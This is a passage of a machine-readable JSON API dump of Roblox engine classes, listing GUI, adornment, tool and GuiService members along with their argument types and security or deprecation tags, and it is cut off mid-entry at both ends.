:[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"input","Type":"Instance"}],"Name":"InputChanged","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"input","Type":"Instance"}],"Name":"InputEnded","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"x","Type":"int"},{"Name":"y","Type":"int"}],"Name":"MouseEnter","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"x","Type":"int"},{"Name":"y","Type":"int"}],"Name":"MouseLeave","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"x","Type":"int"},{"Name":"y","Type":"int"}],"Name":"MouseMoved","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"x","Type":"int"},{"Name":"y","Type":"int"}],"Name":"MouseWheelBackward","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"x","Type":"int"},{"Name":"y","Type":"int"}],"Name":"MouseWheelForward","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[],"Name":"SelectionGained","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[],"Name":"SelectionLost","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"touchPositions","Type":"Array"},{"Name":"state","Type":"UserInputState"}],"Name":"TouchLongPress","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"touchPositions","Type":"Array"},{"Name":"totalTranslation","Type":"Vector2"},{"Name":"velocity","Type":"Vector2"},{"Name":"state","Type":"UserInputState"}],"Name":"TouchPan","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"touchPositions","Type":"Array"},{"Name":"scale","Type":"float"},{"Name":"velocity","Type":"float"},{"Name":"state","Type":"UserInputState"}],"Name":"TouchPinch","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"touchPositions","Type":"Array"},{"Name":"rotation","Type":"float"},{"Name":"velocity","Type":"float"},{"Name":"state","Type":"UserInputState"}],"Name":"TouchRotate","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"swipeDirection","Type":"SwipeDirection"},{"Name":"numberOfTouches","Type":"int"}],"Name":"TouchSwipe","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"touchPositions","Type":"Array"}],"Name":"TouchTap","tags":[],"Class":"GuiObject","type":"Event"},{"Superclass":"GuiObject","type":"Class","Name":"Frame","tags":[]},{"ValueType":"FrameStyle","type":"Property","Name":"Style","tags":[],"Class":"Frame"},{"Superclass":"GuiObject","type":"Class","Name":"GuiButton","tags":["notbrowsable"]},{"ValueType":"bool","type":"Property","Name":"AutoButtonColor","tags":[],"Class":"GuiButton"},{"ValueType":"bool","type":"Property","Name":"Modal","tags":[],"Class":"GuiButton"},{"ValueType":"bool","type":"Property","Name":"Selected","tags":[],"Class":"GuiButton"},{"ValueType":"ButtonStyle","type":"Property","Name":"Style","tags":[],"Class":"GuiButton"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"verb","Default":null}],"Name":"SetVerb","tags":["RobloxScriptSecurity"],"Class":"GuiButton","type":"Function"},{"Arguments":[],"Name":"MouseButton1Click","tags":[],"Class":"GuiButton","type":"Event"},{"Arguments":[{"Name":"x","Type":"int"},{"Name":"y","Type":"int"}],"Name":"MouseButton1Down","tags":[],"Class":"GuiButton","type":"Event"},{"Arguments":[{"Name":"x","Type":"int"},{"Name":"y","Type":"int"}],"Name":"MouseButton1Up","tags":[],"Class":"GuiButton","type":"Event"},{"Arguments":[],"Name":"MouseButton2Click","tags":[],"Class":"GuiButton","type":"Event"},{"Arguments":[{"Name":"x","Type":"int"},{"Name":"y","Type":"int"}],"Name":"MouseButton2Down","tags":[],"Class":"GuiButton","type":"Event"},{"Arguments":[{"Name":"x","Type":"int"},{"Name":"y","Type":"int"}],"Name":"MouseButton2Up","tags":[],"Class":"GuiButton","type":"Event"},{"Superclass":"GuiButton","type":"Class","Name":"ImageButton","tags":[]},{"ValueType":"Content","type":"Property","Name":"Image","tags":[],"Class":"ImageButton"},{"ValueType":"Color3","type":"Property","Name":"ImageColor3","tags":[],"Class":"ImageButton"},{"ValueType":"Vector2","type":"Property","Name":"ImageRectOffset","tags":[],"Class":"ImageButton"},{"ValueType":"Vector2","type":"Property","Name":"ImageRectSize","tags":[],"Class":"ImageButton"},{"ValueType":"float","type":"Property","Name":"ImageTransparency","tags":[],"Class":"ImageButton"},{"ValueType":"ScaleType","type":"Property","Name":"ScaleType","tags":[],"Class":"ImageButton"},{"ValueType":"Rect2D","type":"Property","Name":"SliceCenter","tags":[],"Class":"ImageButton"},{"Superclass":"GuiButton","type":"Class","Name":"TextButton","tags":[]},{"ValueType":"Font","type":"Property","Name":"Font","tags":[],"Class":"TextButton"},{"ValueType":"FontSize","type":"Property","Name":"FontSize","tags":[],"Class":"TextButton"},{"ValueType":"string","type":"Property","Name":"Text","tags":[],"Class":"TextButton"},{"ValueType":"Vector2","type":"Property","Name":"TextBounds","tags":["readonly"],"Class":"TextButton"},{"ValueType":"BrickColor","type":"Property","Name":"TextColor","tags":["deprecated","hidden"],"Class":"TextButton"},{"ValueType":"Color3","type":"Property","Name":"TextColor3","tags":[],"Class":"TextButton"},{"ValueType":"bool","type":"Property","Name":"TextFits","tags":["readonly"],"Class":"TextButton"},{"ValueType":"bool","type":"Property","Name":"TextScaled","tags":[],"Class":"TextButton"},{"ValueType":"Color3","type":"Property","Name":"TextStrokeColor3","tags":[],"Class":"TextButton"},{"ValueType":"float","type":"Property","Name":"TextStrokeTransparency","tags":[],"Class":"TextButton"},{"ValueType":"float","type":"Property","Name":"TextTransparency","tags":[],"Class":"TextButton"},{"ValueType":"bool","type":"Property","Name":"TextWrap","tags":["deprecated"],"Class":"TextButton"},{"ValueType":"bool","type":"Property","Name":"TextWrapped","tags":[],"Class":"TextButton"},{"ValueType":"TextXAlignment","type":"Property","Name":"TextXAlignment","tags":[],"Class":"TextButton"},{"ValueType":"TextYAlignment","type":"Property","Name":"TextYAlignment","tags":[],"Class":"TextButton"},{"Superclass":"GuiObject","type":"Class","Name":"GuiLabel","tags":[]},{"Superclass":"GuiLabel","type":"Class","Name":"ImageLabel","tags":[]},{"ValueType":"Content","type":"Property","Name":"Image","tags":[],"Class":"ImageLabel"},{"ValueType":"Color3","type":"Property","Name":"ImageColor3","tags":[],"Class":"ImageLabel"},{"ValueType":"Vector2","type":"Property","Name":"ImageRectOffset","tags":[],"Class":"ImageLabel"},{"ValueType":"Vector2","type":"Property","Name":"ImageRectSize","tags":[],"Class":"ImageLabel"},{"ValueType":"float","type":"Property","Name":"ImageTransparency","tags":[],"Class":"ImageLabel"},{"ValueType":"ScaleType","type":"Property","Name":"ScaleType","tags":[],"Class":"ImageLabel"},{"ValueType":"Rect2D","type":"Property","Name":"SliceCenter","tags":[],"Class":"ImageLabel"},{"Superclass":"GuiLabel","type":"Class","Name":"TextLabel","tags":[]},{"ValueType":"Font","type":"Property","Name":"Font","tags":[],"Class":"TextLabel"},{"ValueType":"FontSize","type":"Property","Name":"FontSize","tags":[],"Class":"TextLabel"},{"ValueType":"string","type":"Property","Name":"Text","tags":[],"Class":"TextLabel"},{"ValueType":"Vector2","type":"Property","Name":"TextBounds","tags":["readonly"],"Class":"TextLabel"},{"ValueType":"BrickColor","type":"Property","Name":"TextColor","tags":["deprecated","hidden"],"Class":"TextLabel"},{"ValueType":"Color3","type":"Property","Name":"TextColor3","tags":[],"Class":"TextLabel"},{"ValueType":"bool","type":"Property","Name":"TextFits","tags":["readonly"],"Class":"TextLabel"},{"ValueType":"bool","type":"Property","Name":"TextScaled","tags":[],"Class":"TextLabel"},{"ValueType":"Color3","type":"Property","Name":"TextStrokeColor3","tags":[],"Class":"TextLabel"},{"ValueType":"float","type":"Property","Name":"TextStrokeTransparency","tags":[],"Class":"TextLabel"},{"ValueType":"float","type":"Property","Name":"TextTransparency","tags":[],"Class":"TextLabel"},{"ValueType":"bool","type":"Property","Name":"TextWrap","tags":["deprecated"],"Class":"TextLabel"},{"ValueType":"bool","type":"Property","Name":"TextWrapped","tags":[],"Class":"TextLabel"},{"ValueType":"TextXAlignment","type":"Property","Name":"TextXAlignment","tags":[],"Class":"TextLabel"},{"ValueType":"TextYAlignment","type":"Property","Name":"TextYAlignment","tags":[],"Class":"TextLabel"},{"Superclass":"GuiObject","type":"Class","Name":"Scale9Frame","tags":[]},{"ValueType":"Vector2int16","type":"Property","Name":"ScaleEdgeSize","tags":[],"Class":"Scale9Frame"},{"ValueType":"string","type":"Property","Name":"SlicePrefix","tags":[],"Class":"Scale9Frame"},{"Superclass":"GuiObject","type":"Class","Name":"ScrollingFrame","tags":[]},{"ValueType":"Vector2","type":"Property","Name":"AbsoluteWindowSize","tags":["readonly"],"Class":"ScrollingFrame"},{"ValueType":"Content","type":"Property","Name":"BottomImage","tags":[],"Class":"ScrollingFrame"},{"ValueType":"Vector2","type":"Property","Name":"CanvasPosition","tags":[],"Class":"ScrollingFrame"},{"ValueType":"UDim2","type":"Property","Name":"CanvasSize","tags":[],"Class":"ScrollingFrame"},{"ValueType":"Content","type":"Property","Name":"MidImage","tags":[],"Class":"ScrollingFrame"},{"ValueType":"int","type":"Property","Name":"ScrollBarThickness","tags":[],"Class":"ScrollingFrame"},{"ValueType":"bool","type":"Property","Name":"ScrollingEnabled","tags":[],"Class":"ScrollingFrame"},{"ValueType":"Content","type":"Property","Name":"TopImage","tags":[],"Class":"ScrollingFrame"},{"Superclass":"GuiObject","type":"Class","Name":"TextBox","tags":[]},{"ValueType":"bool","type":"Property","Name":"ClearTextOnFocus","tags":[],"Class":"TextBox"},{"ValueType":"Font","type":"Property","Name":"Font","tags":[],"Class":"TextBox"},{"ValueType":"FontSize","type":"Property","Name":"FontSize","tags":[],"Class":"TextBox"},{"ValueType":"bool","type":"Property","Name":"MultiLine","tags":[],"Class":"TextBox"},{"ValueType":"string","type":"Property","Name":"Text","tags":[],"Class":"TextBox"},{"ValueType":"Vector2","type":"Property","Name":"TextBounds","tags":["readonly"],"Class":"TextBox"},{"ValueType":"BrickColor","type":"Property","Name":"TextColor","tags":["deprecated","hidden"],"Class":"TextBox"},{"ValueType":"Color3","type":"Property","Name":"TextColor3","tags":[],"Class":"TextBox"},{"ValueType":"bool","type":"Property","Name":"TextFits","tags":["readonly"],"Class":"TextBox"},{"ValueType":"bool","type":"Property","Name":"TextScaled","tags":[],"Class":"TextBox"},{"ValueType":"Color3","type":"Property","Name":"TextStrokeColor3","tags":[],"Class":"TextBox"},{"ValueType":"float","type":"Property","Name":"TextStrokeTransparency","tags":[],"Class":"TextBox"},{"ValueType":"float","type":"Property","Name":"TextTransparency","tags":[],"Class":"TextBox"},{"ValueType":"bool","type":"Property","Name":"TextWrap","tags":["deprecated"],"Class":"TextBox"},{"ValueType":"bool","type":"Property","Name":"TextWrapped","tags":[],"Class":"TextBox"},{"ValueType":"TextXAlignment","type":"Property","Name":"TextXAlignment","tags":[],"Class":"TextBox"},{"ValueType":"TextYAlignment","type":"Property","Name":"TextYAlignment","tags":[],"Class":"TextBox"},{"ReturnType":"void","Arguments":[],"Name":"CaptureFocus","tags":[],"Class":"TextBox","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"IsFocused","tags":[],"Class":"TextBox","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ReleaseFocus","tags":[],"Class":"TextBox","type":"Function"},{"Arguments":[{"Name":"enterPressed","Type":"bool"},{"Name":"inputThatCausedFocusLoss","Type":"Instance"}],"Name":"FocusLost","tags":[],"Class":"TextBox","type":"Event"},{"Arguments":[],"Name":"Focused","tags":[],"Class":"TextBox","type":"Event"},{"Superclass":"GuiBase2d","type":"Class","Name":"LayerCollector","tags":[]},{"Superclass":"LayerCollector","type":"Class","Name":"BillboardGui","tags":[]},{"ValueType":"bool","type":"Property","Name":"Active","tags":[],"Class":"BillboardGui"},{"ValueType":"Object","type":"Property","Name":"Adornee","tags":[],"Class":"BillboardGui"},{"ValueType":"bool","type":"Property","Name":"AlwaysOnTop","tags":[],"Class":"BillboardGui"},{"ValueType":"bool","type":"Property","Name":"Enabled","tags":[],"Class":"BillboardGui"},{"ValueType":"Vector3","type":"Property","Name":"ExtentsOffset","tags":[],"Class":"BillboardGui"},{"ValueType":"Object","type":"Property","Name":"PlayerToHideFrom","tags":[],"Class":"BillboardGui"},{"ValueType":"UDim2","type":"Property","Name":"Size","tags":[],"Class":"BillboardGui"},{"ValueType":"Vector2","type":"Property","Name":"SizeOffset","tags":[],"Class":"BillboardGui"},{"ValueType":"Vector3","type":"Property","Name":"StudsOffset","tags":[],"Class":"BillboardGui"},{"Superclass":"LayerCollector","type":"Class","Name":"ScreenGui","tags":[]},{"Superclass":"ScreenGui","type":"Class","Name":"GuiMain","tags":["deprecated"]},{"Superclass":"LayerCollector","type":"Class","Name":"SurfaceGui","tags":[]},{"ValueType":"bool","type":"Property","Name":"Active","tags":[],"Class":"SurfaceGui"},{"ValueType":"Object","type":"Property","Name":"Adornee","tags":[],"Class":"SurfaceGui"},{"ValueType":"bool","type":"Property","Name":"AlwaysOnTop","tags":[],"Class":"SurfaceGui"},{"ValueType":"Vector2","type":"Property","Name":"CanvasSize","tags":[],"Class":"SurfaceGui"},{"ValueType":"bool","type":"Property","Name":"Enabled","tags":[],"Class":"SurfaceGui"},{"ValueType":"NormalId","type":"Property","Name":"Face","tags":[],"Class":"SurfaceGui"},{"ValueType":"float","type":"Property","Name":"ToolPunchThroughDistance","tags":[],"Class":"SurfaceGui"},{"Superclass":"GuiBase","type":"Class","Name":"GuiBase3d","tags":[]},{"ValueType":"BrickColor","type":"Property","Name":"Color","tags":["deprecated","hidden"],"Class":"GuiBase3d"},{"ValueType":"Color3","type":"Property","Name":"Color3","tags":[],"Class":"GuiBase3d"},{"ValueType":"float","type":"Property","Name":"Transparency","tags":[],"Class":"GuiBase3d"},{"ValueType":"bool","type":"Property","Name":"Visible","tags":[],"Class":"GuiBase3d"},{"Superclass":"GuiBase3d","type":"Class","Name":"FloorWire","tags":["deprecated"]},{"ValueType":"float","type":"Property","Name":"CycleOffset","tags":[],"Class":"FloorWire"},{"ValueType":"Object","type":"Property","Name":"From","tags":[],"Class":"FloorWire"},{"ValueType":"float","type":"Property","Name":"StudsBetweenTextures","tags":[],"Class":"FloorWire"},{"ValueType":"Content","type":"Property","Name":"Texture","tags":[],"Class":"FloorWire"},{"ValueType":"Vector2","type":"Property","Name":"TextureSize","tags":[],"Class":"FloorWire"},{"ValueType":"Object","type":"Property","Name":"To","tags":[],"Class":"FloorWire"},{"ValueType":"float","type":"Property","Name":"Velocity","tags":[],"Class":"FloorWire"},{"ValueType":"float","type":"Property","Name":"WireRadius","tags":[],"Class":"FloorWire"},{"Superclass":"GuiBase3d","type":"Class","Name":"PVAdornment","tags":[]},{"ValueType":"Object","type":"Property","Name":"Adornee","tags":[],"Class":"PVAdornment"},{"Superclass":"PVAdornment","type":"Class","Name":"HandleAdornment","tags":[]},{"ValueType":"bool","type":"Property","Name":"AlwaysOnTop","tags":[],"Class":"HandleAdornment"},{"ValueType":"CoordinateFrame","type":"Property","Name":"CFrame","tags":[],"Class":"HandleAdornment"},{"ValueType":"Vector3","type":"Property","Name":"SizeRelativeOffset","tags":[],"Class":"HandleAdornment"},{"ValueType":"int","type":"Property","Name":"ZIndex","tags":[],"Class":"HandleAdornment"},{"Arguments":[],"Name":"MouseButton1Down","tags":[],"Class":"HandleAdornment","type":"Event"},{"Arguments":[],"Name":"MouseButton1Up","tags":[],"Class":"HandleAdornment","type":"Event"},{"Arguments":[],"Name":"MouseEnter","tags":[],"Class":"HandleAdornment","type":"Event"},{"Arguments":[],"Name":"MouseLeave","tags":[],"Class":"HandleAdornment","type":"Event"},{"Superclass":"HandleAdornment","type":"Class","Name":"BoxHandleAdornment","tags":[]},{"ValueType":"Vector3","type":"Property","Name":"Size","tags":[],"Class":"BoxHandleAdornment"},{"Superclass":"HandleAdornment","type":"Class","Name":"ConeHandleAdornment","tags":[]},{"ValueType":"float","type":"Property","Name":"Height","tags":[],"Class":"ConeHandleAdornment"},{"ValueType":"float","type":"Property","Name":"Radius","tags":[],"Class":"ConeHandleAdornment"},{"Superclass":"HandleAdornment","type":"Class","Name":"CylinderHandleAdornment","tags":[]},{"ValueType":"float","type":"Property","Name":"Height","tags":[],"Class":"CylinderHandleAdornment"},{"ValueType":"float","type":"Property","Name":"Radius","tags":[],"Class":"CylinderHandleAdornment"},{"Superclass":"HandleAdornment","type":"Class","Name":"ImageHandleAdornment","tags":[]},{"ValueType":"Content","type":"Property","Name":"Image","tags":[],"Class":"ImageHandleAdornment"},{"ValueType":"Vector2","type":"Property","Name":"Size","tags":[],"Class":"ImageHandleAdornment"},{"Superclass":"HandleAdornment","type":"Class","Name":"LineHandleAdornment","tags":[]},{"ValueType":"float","type":"Property","Name":"Length","tags":[],"Class":"LineHandleAdornment"},{"ValueType":"float","type":"Property","Name":"Thickness","tags":[],"Class":"LineHandleAdornment"},{"Superclass":"HandleAdornment","type":"Class","Name":"SphereHandleAdornment","tags":[]},{"ValueType":"float","type":"Property","Name":"Radius","tags":[],"Class":"SphereHandleAdornment"},{"Superclass":"PVAdornment","type":"Class","Name":"SelectionBox","tags":[]},{"ValueType":"float","type":"Property","Name":"LineThickness","tags":[],"Class":"SelectionBox"},{"ValueType":"BrickColor","type":"Property","Name":"SurfaceColor","tags":["deprecated","hidden"],"Class":"SelectionBox"},{"ValueType":"Color3","type":"Property","Name":"SurfaceColor3","tags":[],"Class":"SelectionBox"},{"ValueType":"float","type":"Property","Name":"SurfaceTransparency","tags":[],"Class":"SelectionBox"},{"Superclass":"PVAdornment","type":"Class","Name":"SelectionSphere","tags":[]},{"ValueType":"BrickColor","type":"Property","Name":"SurfaceColor","tags":["deprecated","hidden"],"Class":"SelectionSphere"},{"ValueType":"Color3","type":"Property","Name":"SurfaceColor3","tags":[],"Class":"SelectionSphere"},{"ValueType":"float","type":"Property","Name":"SurfaceTransparency","tags":[],"Class":"SelectionSphere"},{"Superclass":"GuiBase3d","type":"Class","Name":"PartAdornment","tags":[]},{"ValueType":"Object","type":"Property","Name":"Adornee","tags":[],"Class":"PartAdornment"},{"Superclass":"PartAdornment","type":"Class","Name":"HandlesBase","tags":[]},{"Superclass":"HandlesBase","type":"Class","Name":"ArcHandles","tags":[]},{"ValueType":"Axes","type":"Property","Name":"Axes","tags":[],"Class":"ArcHandles"},{"Arguments":[{"Name":"axis","Type":"Axis"}],"Name":"MouseButton1Down","tags":[],"Class":"ArcHandles","type":"Event"},{"Arguments":[{"Name":"axis","Type":"Axis"}],"Name":"MouseButton1Up","tags":[],"Class":"ArcHandles","type":"Event"},{"Arguments":[{"Name":"axis","Type":"Axis"},{"Name":"relativeAngle","Type":"float"},{"Name":"deltaRadius","Type":"float"}],"Name":"MouseDrag","tags":[],"Class":"ArcHandles","type":"Event"},{"Arguments":[{"Name":"axis","Type":"Axis"}],"Name":"MouseEnter","tags":[],"Class":"ArcHandles","type":"Event"},{"Arguments":[{"Name":"axis","Type":"Axis"}],"Name":"MouseLeave","tags":[],"Class":"ArcHandles","type":"Event"},{"Superclass":"HandlesBase","type":"Class","Name":"Handles","tags":[]},{"ValueType":"Faces","type":"Property","Name":"Faces","tags":[],"Class":"Handles"},{"ValueType":"HandlesStyle","type":"Property","Name":"Style","tags":[],"Class":"Handles"},{"Arguments":[{"Name":"face","Type":"NormalId"}],"Name":"MouseButton1Down","tags":[],"Class":"Handles","type":"Event"},{"Arguments":[{"Name":"face","Type":"NormalId"}],"Name":"MouseButton1Up","tags":[],"Class":"Handles","type":"Event"},{"Arguments":[{"Name":"face","Type":"NormalId"},{"Name":"distance","Type":"float"}],"Name":"MouseDrag","tags":[],"Class":"Handles","type":"Event"},{"Arguments":[{"Name":"face","Type":"NormalId"}],"Name":"MouseEnter","tags":[],"Class":"Handles","type":"Event"},{"Arguments":[{"Name":"face","Type":"NormalId"}],"Name":"MouseLeave","tags":[],"Class":"Handles","type":"Event"},{"Superclass":"PartAdornment","type":"Class","Name":"SurfaceSelection","tags":[]},{"ValueType":"NormalId","type":"Property","Name":"TargetSurface","tags":[],"Class":"SurfaceSelection"},{"Superclass":"GuiBase3d","type":"Class","Name":"SelectionLasso","tags":[]},{"ValueType":"Object","type":"Property","Name":"Humanoid","tags":[],"Class":"SelectionLasso"},{"Superclass":"SelectionLasso","type":"Class","Name":"SelectionPartLasso","tags":["deprecated"]},{"ValueType":"Object","type":"Property","Name":"Part","tags":[],"Class":"SelectionPartLasso"},{"Superclass":"SelectionLasso","type":"Class","Name":"SelectionPointLasso","tags":["deprecated"]},{"ValueType":"Vector3","type":"Property","Name":"Point","tags":[],"Class":"SelectionPointLasso"},{"Superclass":"GuiBase3d","type":"Class","Name":"TextureTrail","tags":["deprecated"]},{"ValueType":"float","type":"Property","Name":"CycleOffset","tags":["RobloxPlaceSecurity"],"Class":"TextureTrail"},{"ValueType":"Object","type":"Property","Name":"From","tags":["RobloxPlaceSecurity"],"Class":"TextureTrail"},{"ValueType":"float","type":"Property","Name":"StudsBetweenTextures","tags":["RobloxPlaceSecurity"],"Class":"TextureTrail"},{"ValueType":"Content","type":"Property","Name":"Texture","tags":["RobloxPlaceSecurity"],"Class":"TextureTrail"},{"ValueType":"Vector2","type":"Property","Name":"TextureSize","tags":["RobloxPlaceSecurity"],"Class":"TextureTrail"},{"ValueType":"Object","type":"Property","Name":"To","tags":["RobloxPlaceSecurity"],"Class":"TextureTrail"},{"ValueType":"float","type":"Property","Name":"Velocity","tags":["RobloxPlaceSecurity"],"Class":"TextureTrail"},{"Superclass":"Instance","type":"Class","Name":"GuiItem","tags":[]},{"Superclass":"GuiItem","type":"Class","Name":"Backpack","tags":[]},{"Superclass":"GuiItem","type":"Class","Name":"BackpackItem","tags":[]},{"ValueType":"Content","type":"Property","Name":"TextureId","tags":[],"Class":"BackpackItem"},{"Superclass":"BackpackItem","type":"Class","Name":"HopperBin","tags":["deprecated"]},{"ValueType":"bool","type":"Property","Name":"Active","tags":[],"Class":"HopperBin"},{"ValueType":"BinType","type":"Property","Name":"BinType","tags":[],"Class":"HopperBin"},{"ReturnType":"void","Arguments":[],"Name":"Disable","tags":["RobloxScriptSecurity"],"Class":"HopperBin","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ToggleSelect","tags":["RobloxScriptSecurity"],"Class":"HopperBin","type":"Function"},{"Arguments":[],"Name":"Deselected","tags":[],"Class":"HopperBin","type":"Event"},{"Arguments":[{"Name":"mouse","Type":"Instance"}],"Name":"Selected","tags":[],"Class":"HopperBin","type":"Event"},{"Superclass":"BackpackItem","type":"Class","Name":"Tool","tags":[]},{"ValueType":"bool","type":"Property","Name":"CanBeDropped","tags":[],"Class":"Tool"},{"ValueType":"bool","type":"Property","Name":"Enabled","tags":[],"Class":"Tool"},{"ValueType":"CoordinateFrame","type":"Property","Name":"Grip","tags":[],"Class":"Tool"},{"ValueType":"Vector3","type":"Property","Name":"GripForward","tags":[],"Class":"Tool"},{"ValueType":"Vector3","type":"Property","Name":"GripPos","tags":[],"Class":"Tool"},{"ValueType":"Vector3","type":"Property","Name":"GripRight","tags":[],"Class":"Tool"},{"ValueType":"Vector3","type":"Property","Name":"GripUp","tags":[],"Class":"Tool"},{"ValueType":"bool","type":"Property","Name":"ManualActivationOnly","tags":[],"Class":"Tool"},{"ValueType":"bool","type":"Property","Name":"RequiresHandle","tags":[],"Class":"Tool"},{"ValueType":"string","type":"Property","Name":"ToolTip","tags":[],"Class":"Tool"},{"ReturnType":"void","Arguments":[],"Name":"Activate","tags":[],"Class":"Tool","type":"Function"},{"Arguments":[],"Name":"Activated","tags":[],"Class":"Tool","type":"Event"},{"Arguments":[],"Name":"Deactivated","tags":[],"Class":"Tool","type":"Event"},{"Arguments":[{"Name":"mouse","Type":"Instance"}],"Name":"Equipped","tags":[],"Class":"Tool","type":"Event"},{"Arguments":[],"Name":"Unequipped","tags":[],"Class":"Tool","type":"Event"},{"Superclass":"Tool","type":"Class","Name":"Flag","tags":["deprecated"]},{"ValueType":"BrickColor","type":"Property","Name":"TeamColor","tags":[],"Class":"Flag"},{"Superclass":"GuiItem","type":"Class","Name":"ButtonBindingWidget","tags":[]},{"Superclass":"GuiItem","type":"Class","Name":"GuiRoot","tags":["notCreatable"]},{"Superclass":"GuiItem","type":"Class","Name":"Hopper","tags":["deprecated"]},{"Superclass":"GuiItem","type":"Class","Name":"StarterPack","tags":[]},{"Superclass":"Instance","type":"Class","Name":"GuiService","tags":["notCreatable"]},{"ValueType":"bool","type":"Property","Name":"AutoSelectGuiEnabled","tags":[],"Class":"GuiService"},{"ValueType":"bool","type":"Property","Name":"CoreGuiNavigationEnabled","tags":[],"Class":"GuiService"},{"ValueType":"bool","type":"Property","Name":"GuiNavigationEnabled","tags":[],"Class":"GuiService"},{"ValueType":"bool","type":"Property","Name":"IsModalDialog","tags":["deprecated","readonly"],"Class":"GuiService"},{"ValueType":"bool","type":"Property","Name":"IsWindows","tags":["deprecated","readonly"],"Class":"GuiService"},{"ValueType":"bool","type":"Property","Name":"MenuIsOpen","tags":["readonly"],"Class":"GuiService"},{"ValueType":"bool","type":"Property","Name":"ScreenGuiEnabled","tags":["RobloxScriptSecurity"],"Class":"GuiService"},{"ValueType":"Object","type":"Property","Name":"SelectedCoreObject","tags":["RobloxScriptSecurity"],"Class":"GuiService"},{"ValueType":"Object","type":"Property","Name":"SelectedObject","tags":[],"Class":"GuiService"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"dialog","Default":null},{"Type":"CenterDialogType","Name":"centerDialogType","Default":null},{"Type":"Function","Name":"showFunction","Default":null},{"Type":"Function","Name":"hideFunction","Default":null}],"Name":"AddCenterDialog","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"AddKey","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"selectionName","Default":null},{"Type":"Instance","Name":"selectionParent","Default":null}],"Name":"AddSelectionParent","tags":[],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"selectionName","Default":null},{"Type":"Tuple","Name":"selections","Default":null}],"Name":"AddSelectionTuple","tags":[],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"SpecialKey","Name":"key","Default":null}],"Name":"AddSpecialKey","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"int","Arguments":[],"Name":"GetBrickCount","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"Vector3","Name":"position","Default":null}],"Name":"GetClosestDialogToPosition","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"string","Arguments":[],"Name":"GetErrorMessage","tags":["RobloxScriptSecurity","deprecated"],"Class":"GuiService","type":"Function"},{"ReturnType":"string","Arguments":[],"Name":"GetUiMessage","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"IsTenFootInterface","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"OpenBrowserWindow","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"dialog","Default":null}],"Name":"RemoveCenterDialog","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"RemoveKey","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"selectionName","Default":null}],"Name":"RemoveSelectionGroup","tags":[],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"SpecialKey","Name":"key","Default":null}],"Name":"RemoveSpecialKey","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"errorMessage","Default":null}],"Name":"SetErrorMessage","tags":["LocalUserSecurity","deprecated"],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"x1","Default":null},{"Type":"int","Name":"y1","Default":null},{"Type":"int","Name":"x2","Default":null},{"Type":"int","Name":"y2","Default":null}],"Name":"SetGlobalGuiInset","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"open","Default":null}],"Name":"SetMenuIsOpen","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"UiMessageType","Name":"msgType","Default":null},{"Type":"string","Name":"uiMessage","Default":null}],"Name":"SetUiMessage","tags":["LocalUserSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"string","Name":"input","Default":null}],"Name":"ShowStatsBasedOnInputString","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ToggleFullscreen","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"Vector2","Arguments":[],"Name":"GetScreenResolution","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"YieldFunction"},{"Arguments":[],"Name":"BrowserWindowClosed","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Event"},{"Arguments":[{"Name":"newErrorMessage","Type":"string"}],"Name":"ErrorMessageChanged","tags":["RobloxS